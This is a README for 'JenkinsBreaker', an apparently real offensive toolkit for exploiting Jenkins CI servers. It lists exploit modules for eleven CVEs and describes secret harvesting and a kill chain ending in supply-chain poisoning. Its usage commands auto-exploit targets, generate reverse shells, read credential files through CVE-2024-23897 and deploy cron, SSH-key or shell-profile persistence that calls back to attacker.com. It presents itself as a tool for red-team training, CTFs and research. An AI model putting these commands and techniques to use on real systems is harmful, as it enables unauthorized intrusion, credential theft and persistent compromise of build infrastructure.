<!--
JenkinsBreaker Jenkins exploitation tool, Jenkins CVE exploit automation,
CVE-2019-1003029 Groovy RCE, CVE-2024-23897 CLI arbitrary file read,
Jenkins credential dumper, Jenkins reverse shell generator,
post-exploitation automation Jenkins, JWT brute force Jenkins,
AWS secret CI/CD extraction, offensive CI security,
HackTheBox Jenkins challenge exploitation, red team devops breach,
CI pipeline compromise tooling, Jenkins CLI exploit,
misconfiguration exploit framework Jenkins, SCADA build server weaknesses,
ridpath cybersecurity GitHub, CTF Jenkins auto pwn architecture
-->

# JenkinsBreaker  
Advanced CI/CD Exploitation Toolkit for Research, CTF, and Red Team Simulation

![Status Alpha](https://img.shields.io/badge/status-alpha-yellow)
![Stability Experimental](https://img.shields.io/badge/stability-experimental-orange)
![Domain CI/CD Security](https://img.shields.io/badge/domain-CI%2FCD%20Security-critical)
![License MIT](https://img.shields.io/badge/license-MIT-blue)

> Designed for training, authorized assessment, and adversary simulation in controlled environments.
---

## Features  

JenkinsBreaker is an offensive Python framework focused on exploiting **Jenkins servers** as an entry point for CI/CD abuse, credential theft, and lateral movement across DevOps infrastructure.

Key goals:

• Automate common **Jenkins RCE chains**  
• Provide reliable **post-exploitation tooling**  
• Support **CTF speed running workflows**  
• Extract credentials + secrets from CI environments  
• Enable research into **CI/CD security risks**

- **Automated Enumeration & Exploitation** (`--auto` mode with version fingerprinting)
- **Exploit Critical CVEs** (11 modules):
  - CVE-2018-1000861 – Jenkins Core Stapler RCE
  - CVE-2019-1003029 / CVE-2019-1003030 – Script Security Groovy RCE
  - CVE-2024-23897 – CLI Arbitrary File Read
  - CVE-2020-2100 – Git Plugin Remote Code Execution
  - CVE-2021-21686 – Agent-to-Controller Path Traversal
  - CVE-2018-1000402 – AWS CodeDeploy Environment Variable Exposure
  - CVE-2018-1000600 – GitHub Plugin SSRF Arbitrary File Read
  - CVE-2019-10358 – Maven Plugin Information Disclosure
  - CVE-2018-1999002 – Pipeline Groovy Plugin RCE
  - CVE-2019-10392 – Git Client Plugin Command Injection
  - CVE-2019-10399 – Workflow CPS Plugin Sandbox Bypass
- **Reverse Shell Payload Generation** (Bash, Python, Groovy, PowerShell, Metasploit Compatible)
- **Secrets Extraction & Post-Exploitation**:
  - AWS credentials (`.aws/credentials`, environment variables, job configs)
  - SSH keys (`.ssh/id_rsa`, Jenkins credentials store)
  - API tokens (Docker, NPM, Maven, GitHub, Slack, Datadog, SendGrid, Twilio)
  - Database credentials (PostgreSQL, MySQL, MongoDB, Redis)
  - Cloud provider credentials (AWS, GCP, Azure, Kubernetes)
- **CSRF Crumb Handling & Automation**
- **JWT Token Brute-Forcing and Analysis**
- **Post-Exploitation Recon Automation** (Auto Upload & Execute linPEAS, pspy)
- **Report Generation**: JSON, Markdown, PDF (via WeasyPrint)
- **Persistence Techniques** (Cron Jobs, Jenkins Pipelines)
- **Modular Exploit Loading** (`exploits/` Directory)
- **Integrated Jenkins Lab** for CVE testing and validation
- **Modules (New)**:
  - Textual TUI – Interactive terminal interface with real-time exploitation
  - Web UI – Browser-based dashboard with FastAPI + WebSocket support
  - JenkinsFuzzer – Pipeline misconfiguration discovery (8 fuzzing modules)
  - JWT Breaker – JWT cryptanalysis with algorithm confusion
  - Plugin Fingerprint Engine – CVE correlation with 40+ vulnerability mappings
  - Persistence Manager – 7 post-exploitation persistence mechanisms  

---
<!--
MITRE ATT&CK Jenkins exploitation mapping, CI/CD pipeline breach techniques,
initial access via CI servers, Jenkins credential exfiltration MITRE mapping,
execution via Groovy RCE, privilege escalation through pipeline abuse,
defense evasion DevOps, lateral movement from Jenkins to cloud,
command and control CI-based beaconing,
ridpath JenkinsBreaker adversary simulation mapping
-->

## MITRE ATT&CK Mapping

| Phase | Technique | Mapping | Applied In JenkinsBreaker |
|------|-----------|---------|--------------------------|
| Initial Access | Exploit Public-Facing Application | T1190 | Groovy RCE / Arbitrary File Read |
| Execution | Command Execution via Script Engine | T1059.006 | Groovy execution via CLI |
| Privilege Escalation | Abuse Elevated Build Permissions | T1068 | Pipeline takeover / credential harvesting |
| Credential Access | Unsecured Credential Stores | T1552.001 | Secrets extraction from config & plugins |
| Discovery | Remote System Enumeration | T1087 / T1082 | Plugin, version & workspace scanning |
| Lateral Movement | Use Alternate Authentication Mechanisms | T1550 | Token + API reuse for cloud access |
| Exfiltration | Exfiltration Over Web Service | T1567.002 | Reverse shell, beaconing |
| Persistence | Scheduled Task/Job | T1053.003 | Malicious cron + pipeline persistence |
| Collection | Cloud Credential Dumping | T1552.005 | AWS key harvesting from builds |
| Defense Evasion | Indicator Removal / Obfuscation | T1070 | Plugin-based masking / cleanup |

> Helps blue teams align detection to CI/CD risks.

---
<!--
CI/CD attack chain, Jenkins exploitation lifecycle,
supply chain breach via build servers, software factory compromise,
reverse shell from build agents, pivot from CI to cloud,
DevOps pipeline security research diagram,
adversary-in-the-pipeline conceptual model
-->

## CI/CD Attack Kill Chain (Jenkins Focused)

Below is a streamlined adversarial flow commonly observed during Jenkins exploitation:

1. **Target Jenkins Web / CLI**
   - Identify exposed Jenkins UI or CLI attack surfaces
   - Look for weak auth, anonymous access, plugin misconfigurations

2. **Exploit Vulnerability (RCE / Arbitrary File Read)**
   - Execute Jenkins CVEs or plugin-based execution chains
   - Achieve remote code execution or sensitive file retrieval

3. **Build Server Compromise**
   - Harvest agent credentials, stored API tokens, AWS keys
   - Extract artifacts, SSH `id_rsa`, Docker registry creds

4. **Post-Exploitation Automation**
   - Upload recon tooling (e.g., linPEAS, pspy)
   - Enumerate pipelines, artifacts, nodes, user roles

5. **CI → Cloud Pivoting**
   - Abuse pipeline permissions to assume cloud roles (OIDC/AWS STS)
   - Modify IaC to establish stealthy persistence

6. **Lateral Movement Into Production**
   - Jenkins-as-a-jump-host into protected environments
   - Establish covert C2 using HTTPS or WebSockets

7. **(Optional) Supply-Chain Tampering**
   - Inject malicious payloads into build artifacts/containers
   - Poison downstream deployments + production fleets

> CI-driven breach escalation path → from Jenkins → cloud → production → end-users.

<!--
jenkins c2 pivot, ci cd lateral movement, jenkins supply chain compromise,
devops pipeline exploitation, cloud credential theft, red team ci frameworks,
pipeline privilege escalation, artifact poisoning, c2 via build systems,
jenkins security researcher tools, attack surface mapping jenkins,
ridpath github jenkinsbreaker attacker workflow
-->


<!--
Jenkins CI/CD exploitation map, DevOps privilege escalation flow,
build server exploitation, AWS credential theft via CI/CD,
reverse shell via Jenkins pipelines, cloud lateral movement from CI,
CI-driven software supply chain compromise, attack lifecycle mapping,
ridpath jenkinsbreaker security automation
-->

---
## Installation  

```bash
git clone https://github.com/ridpath/heaplessNights.git
cd heaplessNights/JenkinsBreaker
python3 JenkinsBreaker.py --help  # Auto-creates virtualenv and installs dependencies
```

## Jenkins Lab (Testing Environment)

Integrated Docker-based vulnerable Jenkins environment for exploit validation and training.

### Quick Start

```bash
cd jenkins-lab
docker-compose up -d
# Wait 60 seconds for Jenkins to fully initialize
# Access UI: http://localhost:8080 (admin:admin)
```

### Lab Features

- Jenkins Core vulnerable to 11 CVEs
- 16 planted credentials (AWS, SSH, API keys, database credentials)
- 6 pre-configured vulnerable pipelines with embedded secrets
- Privilege escalation vectors (sudo NOPASSWD, cronjobs, writable scripts)
- CSRF protection disabled for testing
- CLI enabled for CVE-2024-23897 exploitation

### Planted Secrets

| Type | Location | Extractable Via |
|------|----------|----------------|
| AWS Credentials | `~/.aws/credentials` | CLI CVE-2024-23897, Groovy |
| SSH Private Key | `~/.ssh/id_rsa` | CLI CVE-2024-23897, Groovy |
| NPM Token | `~/.npmrc` | CLI CVE-2024-23897, Groovy |
| Docker Auth | `~/.docker/config.json` | CLI CVE-2024-23897, Groovy |
| Maven Settings | `~/.m2/settings.xml` | CLI CVE-2024-23897, Groovy |
| Database Creds | `~/.config/database.env` | CLI CVE-2024-23897, Groovy |
| API Keys | `~/.config/api_keys.env` (17 keys) | CLI CVE-2024-23897, Groovy |
| Cloud Creds | `~/.config/cloud.env` | CLI CVE-2024-23897, Groovy |
| Jenkins Creds | `credentials.xml` (16 secrets) | API, Groovy, offsec-jenkins decryptor |

### Testing Exploits

```bash
# Test CVE-2024-23897 (CLI Arbitrary File Read)
cd jenkins-lab/scripts
./test_exploits_production.sh

# Or manually:
wget http://localhost:8080/jnlpJars/jenkins-cli.jar
java -jar jenkins-cli.jar -s http://localhost:8080/ help "@/home/jenkins/.aws/credentials"
```

### Cleanup

```bash
cd jenkins-lab
docker-compose down
docker-compose down -v  # Remove volumes completely
```

## Quick Start

### Core Exploitation

```bash
# Automatic enumeration and exploitation
python3 JenkinsBreaker.py --url http://TARGET_IP:8080 --auto --lhost YOUR_IP --lport 4444

# Run specific CVE exploit
python3 JenkinsBreaker.py --url http://localhost:8080 --exploit-cve CVE-2024-23897 --target-file /etc/passwd

# Generate reverse shell
python3 JenkinsBreaker.py --generate-shell bash --lhost YOUR_IP --lport 4444

# List available exploits
python3 JenkinsBreaker.py --list-cves
```

### Modules

```bash
# Launch Textual TUI
python3 launch_tui.py --url http://localhost:8080 --username admin --password admin

# Launch Web UI (access at http://localhost:8000)
python3 launch_webui.py

# Run JenkinsFuzzer
python3 jenkinsfuzzer.py --url http://localhost:8080 --username admin --password admin

# Perform JWT analysis
python3 jwt_breaker.py --url http://localhost:8080 --username admin --password admin

# Fingerprint plugins and correlate CVEs
python3 plugin_fingerprint.py --url http://localhost:8080 --username admin --password admin

# Generate persistence payloads
python3 persistence.py --url http://localhost:8080 --callback http://attacker.com/payload.sh

# Run integration tests
python3 test_integration.py
```

## WSL Testing

All components tested and validated on WSL Parrot Linux.



### Run from WSL

```bash
# From WSL terminal
cd /mnt/c/Users/YOUR_USER/path/to/JenkinsBreaker

# Test against Jenkins Lab (running on Docker Desktop)
python3 JenkinsBreaker.py --url http://localhost:8080 --auto --lhost 127.0.0.1 --lport 9001

# Extract secrets using offsec-jenkins integration
cd ../offsec-jenkins
python3 decrypt.py --path /var/jenkins_home --export-json loot.json --reveal-secrets
```



## Modules

JenkinsBreaker now includes 6 modules for comprehensive exploitation and post-exploitation workflows:

### 1. Textual TUI (`tui.py`)

Interactive terminal user interface with real-time exploitation dashboard.

**Features:**
- Live connection testing and version fingerprinting
- Plugin enumeration with vulnerability correlation
- CVE exploit table with risk levels and authentication requirements
- Real-time color-coded logging (info/success/error/warning)
- Keyboard shortcuts: `q`=quit, `e`=enumerate, `x`=exploit, `c`=connect, `r`=reset

**Usage:**
```bash
cd JenkinsBreaker
python3 tui.py
```

### 2. Web UI (`web_ui.py`)

Browser-based exploitation dashboard with FastAPI backend and WebSocket support.

**Features:**
- RESTful API for automation (`/api/connect`, `/api/enumerate`, `/api/exploit`)
- WebSocket real-time log streaming
- Embedded single-page application (no external dependencies)
- Real-time statistics tracking (exploits run, successful, failed)
- 4 pre-loaded CVE exploits with severity badges

**Usage:**
```bash
cd JenkinsBreaker
python3 web_ui.py
# Access: http://localhost:8000
```

### 3. JenkinsFuzzer (`jenkinsfuzzer.py`)

Comprehensive pipeline and configuration fuzzing module with 8 attack vectors.

**Fuzzing Modules:**
- Pipeline injection testing (6 Groovy injection payloads)
- Credential exposure detection (AWS keys, SSH keys, API tokens, passwords)
- Script console accessibility probing (bypass header testing)
- Job misconfiguration detection (sandbox disabled, sudo execution, curl-to-shell)
- Parameter injection testing (shell injection, command substitution, path traversal)
- Webhook vulnerability scanning (unauthenticated triggers)
- Plugin-specific misconfigurations
- RBAC bypass testing (path traversal, case manipulation, double encoding)

**Usage:**
```bash
cd JenkinsBreaker
python3 jenkinsfuzzer.py --url http://localhost:8080 --username admin --password admin --output fuzzer_results.json
```

### 4. JWT Breaker (`jwt_breaker.py`)

JWT token cryptanalysis with algorithm confusion and weak secret detection.

**Capabilities:**
- Algorithm confusion attacks (alg: none, RS256→HS256, null signature)
- Weak secret brute forcing with custom wordlists
- JWT token extraction from Jenkins sessions
- Payload manipulation (privilege escalation, user impersonation)
- Signature verification bypass testing
- Key ID (kid) header injection
- JKU/JKW URL injection for remote key loading

**Usage:**
```bash
cd JenkinsBreaker
python3 jwt_breaker.py --url http://localhost:8080 --username admin --password admin --output jwt_findings.json

# With custom wordlist
python3 jwt_breaker.py --url http://localhost:8080 --token YOUR_JWT_TOKEN --wordlist passwords.txt
```

### 5. Plugin Fingerprint Engine (`plugin_fingerprint.py`)

Plugin detection with CVE correlation and exploit recommendations.

**Detection Methods:**
- API-based enumeration (`/pluginManager/api/json`)
- Passive fingerprinting via HTTP headers and HTML resources
- Active endpoint probing (12 plugin signatures)

**CVE Database:**
Includes 40+ CVE mappings for:
- script-security (CVE-2019-1003029, CVE-2019-1003030, CVE-2019-1003040)
- git (CVE-2019-10392, CVE-2018-1000182, CVE-2020-2136)
- credentials (CVE-2019-10320, CVE-2020-2100)
- pipeline-groovy (CVE-2019-1003001, CVE-2019-1003002)
- kubernetes, docker-plugin, aws-credentials, ansible, and more

**Usage:**
```bash
cd JenkinsBreaker
python3 plugin_fingerprint.py --url http://localhost:8080 --username admin --password admin --output plugin_report.json

# Skip active fingerprinting
python3 plugin_fingerprint.py --url http://localhost:8080 --no-active
```

### 6. Persistence Manager (`persistence.py`)

Post-exploitation persistence mechanisms for Linux and Windows.

**Persistence Methods:**
- **Cron Jobs**: Scheduled callback execution
- **Systemd Services**: Persistent background service with auto-restart
- **Windows Registry**: Run key for login persistence
- **SSH Keys**: Authorized keys injection
- **Shell Profiles**: .bashrc/.zshrc/.profile payload injection
- **Windows Scheduled Tasks**: Recurring PowerShell execution
- **Jenkins Jobs**: Cron-triggered pipeline jobs

**Usage:**
```bash
cd JenkinsBreaker

# Generate all payloads
python3 persistence.py --url http://localhost:8080 --username admin --password admin --callback http://attacker.com/payload.sh

# Deploy specific method
python3 persistence.py --url http://localhost:8080 --username admin --password admin --callback http://attacker.com/payload.sh --method cron --deploy

# With SSH key
python3 persistence.py --url http://localhost:8080 --callback http://attacker.com/payload.sh --ssh-key "ssh-rsa AAAAB3..." --method ssh_key --deploy
```

<!--
JenkinsBreaker exploit toolkit SEO footer, Jenkins RCE automation,
CI pipeline security research, credential extraction CI/CD,
DevSecOps red team training lab tool, HackTheBox Jenkins writeups,
post exploitation Jenkins techniques, reverse shell automation CI servers,
CVE exploit chaining Jenkins, CI/CD infrastructure breach demonstration,
offensive DevOps testing, ridpath JenkinsBreaker GitHub project, github.com/ridpath
-->

## Legal Disclaimer

This tool is intended **solely for educational use, security research, and authorized penetration testing**.  

Unauthorized access to computer systems is **illegal** in many jurisdictions and may result in:
- Criminal prosecution  
- Civil liability  
- Employment/contract termination  

By using JenkinsBreaker, you agree that:
- **You are solely responsible** for compliance with all applicable laws and regulations  
- The authors **do not endorse or condone** malicious usage  
- The developers **assume zero liability** for damage or misuse  

Use **only** in **controlled lab environments**, CTFs, or legally authorized engagements.

<!--
jenkins exploit framework legality,
unauthorized jenkins hacking disclaimer,
ethical hacking jenkins tool,
ci cd penetration testing authorization required,
cybersecurity legal notice for exploitation tools,
jenkinsbreaker responsible disclosure,
pentesting agreement requirement,
supply chain security testing legal compliance,
ridpath github jenkins security research tool
-->
## LICENSE
This project is licensed under the MIT License. See the LICENSE file for details.

